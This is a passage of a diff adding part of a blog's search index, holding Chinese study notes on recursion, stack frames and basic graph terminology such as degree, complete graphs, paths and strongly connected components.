+<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><h3 id="0、基础知识-1"><a href="#0、基础知识-1" class="headerlink" title="0、基础知识"></a>0、基础知识</h3><p>（1）递归分为直接递归（调用自身）和间接递归（调用另一个调用自己的函数），间接递归算法都可以转化为直接递归算法来实现，如果一个递归过程或递归函数中的递归调用语句是最后一条执行语句，则称这种递归调用为尾递归</p>
+<p>（2）递归模型由递归出口和递归体两部分构成。递归出口确定递归到何时结束，而递归体确定递归求解时的递推关系</p>
+<p>（3）递归思路的本质是把一个不能或不好直接求解的“大问题”转化为一个或几个“小问题”来解决</p>
+<p>（4）函数调用在内存中实际上是通过栈来实现，用于保存返回地址、函数实参和局部变量等</p>
+<p>（5）一般情况下，尾递归算法可以通过循环或者迭代方式转换为等价的非递归算法，对于不是尾递归的复杂递归算法，可以用栈来模拟递归执行过程，从而将其转换为等价的非递归算法</p>
+<p>（6）获取递归模型通常分为三个步骤，即分析问题、提取递归体和提取递归出口，在实际中需要根据求解问题来操作</p>
+<h3 id="1、栈帧"><a href="#1、栈帧" class="headerlink" title="1、栈帧"></a>1、栈帧</h3><p>大多数CPU上的程序实现使用栈来支持函数调用操作，单个函数调用操作所使用的函数调用栈被称为<strong>栈帧</strong>结构。每次函数调用时都会相应地创建一帧，保存返回地址，函数实参和局部变量值等，并将该帧压入调用栈，如果在该函数返回之前又发生了新的调用，则同样要将与该新函数对应的一帧进栈，作为栈顶。函数一旦执行完毕，对应的栈帧便出栈，控制权交还给该函数的上层调用函数，并按照该帧中保存的返回地址确定程序中继续执行的位置（具体图解可以参照课本p154）</p>
+<h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="0、基础知识-2"><a href="#0、基础知识-2" class="headerlink" title="0、基础知识"></a>0、基础知识</h3><p><strong>（1）端点和邻接点</strong></p>
+<p>在一个无向图中，如果存在一条边<code>(i,j)</code>，则称顶点<code>i</code>和顶点<code>j</code>为该边的两个端点，并称它们互为邻接点，即顶点<code>i</code>是顶点<code>j</code>的一个邻接点，顶点<code>j</code>也是<code>i</code>的一个邻接点。关联于相同两个端点的两条或两条以上的边称为多重边，在数据结构中讨论的图都是没有多重边的图</p>
+<p>在一个有向图中，如果存在一条有向边<code>&lt;i,j&gt;</code>，则称此边为顶点<code>i</code>的一条出边，同时也是顶点<code>j</code>的一条入边，<code>i</code>为此边的起始断电，<code>j</code>为此边的终止断电，<code>j</code>是<code>i</code>的出边邻接点，<code>i</code>是<code>j</code>的入边邻接点</p>
+<p><strong>（2）顶点的度、入度和出度</strong></p>
+<p>在无向图中，一个顶点所关联的边的数目成为该顶点的度，在有向图中，顶点的度又分为入度和出度，以顶点<code>j</code>为终点的边的数目称为该顶点的入度，以顶点<code>i</code>为起点的边数目称为该顶点的出度，一个顶点的入读和出度的和成为该顶点的度</p>
+<p><strong>一个图中所有的顶点的度之和等于边数的两倍</strong></p>
+<p><strong>（3）完全图</strong></p>
+<p>若无向图中每两个顶点之间都存在一条边，有向图中每两个顶点之间都存在着方向相反的两条边，则称此图为完全图</p>
+<p>无向完全图包含有<code>n(n-1)/2</code>条边，有向完全图包含有<code>n(n-1)</code>条边</p>
+<p><strong>（4）稠密图和稀疏图</strong></p>
+<p>当一个图接近完全图时，称为稠密图，相反当一个图含有较少的边数（小于nlog2n）则称之为稀疏图</p>
+<p><strong>（5）子图</strong></p>
+<p>设有两个图<code>G</code>=<code>(V,E)</code>和<code>G&#39;</code>=<code>(V&#39;,E&#39;)</code>，如果<code>V&#39;</code>是<code>V</code>的子集，且<code>E&#39;</code>是<code>E</code>的子集，则称<code>G&#39;</code>是<code>G</code>的子图</p>
+<p><em>图<code>G</code>的子图一定要是一个图，所以并非<code>V</code>的任何子集和<code>E</code>的任何子集都能构成<code>G</code>的子图，因为这两个子集不一定能构成一个图</em></p>
+<p><strong>（6）路径和路径长度</strong></p>
+<p>在一个图中，从顶点<code>i</code>到顶点<code>j</code>的一条路径是一个顶点序列<code>(i,i1,i2,···,im,j)</code>。路径长度是指一条路径上经过的边的数目，如果一条路径上除开始点和结束点可以相同外，其余顶点都不相同，则称该路径为简单路径</p>
+<p><strong>（7）回路或环</strong></p>
+<p>若一条路径上的开始点和结束点为同一个顶点，则此路径被称为回路或环，开始点与结束点相同的简单路径被称为简单回路或简单环</p>
+<p><strong>（8）连通、连通图和连通分量</strong></p>
+<p>在无向图中，如果两个顶点之间有路径，则称这两个顶点是连通的。如果途中的任意两个顶点是连通的，则称该图为连通图，否则为非连通图。无向图中的极大连通子图称为该图的连通分量，连通图的连通分量只有一个（本身），非连通图有多个连通分量</p>
+<p><strong>（9）强连通图和强连通分量</strong></p>
+<p>在有向图<code>G</code>中，若从顶点<code>i</code>到顶点<code>j</code>有路径，则称从顶点<code>i</code>到顶点<code>j</code>是连通的。若有向图中的任意两个顶点都联通，则称该图为强连通图。有向图的极大强连通子图称为该图的强连通分量，显然，强连通图只有一个强连通分量（本身），非强连通图有多个强连通分量</p>
+<p>在一个非强连通图中找强连通分量的方法为：</p>
+<p>①在图中找有向环</p>
+<p>②扩展该有向环：如果某个顶点到该环中的任意顶点有路径，并且该环中的任一顶点到这个顶点也有路径，则将该顶点加入</p>
+<p><strong>（10）权和网</strong></p>
+<p>图中的每一条边都可以附有一个对应的数值，这种与边相关的数值称为权。权可以表示从一个顶点到另一个顶点的距离或者花费的代价，边上带有权的图称为带权图，也称作网</p>
+]]></content>
+      <categories>
+        <category>算法</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+</search>
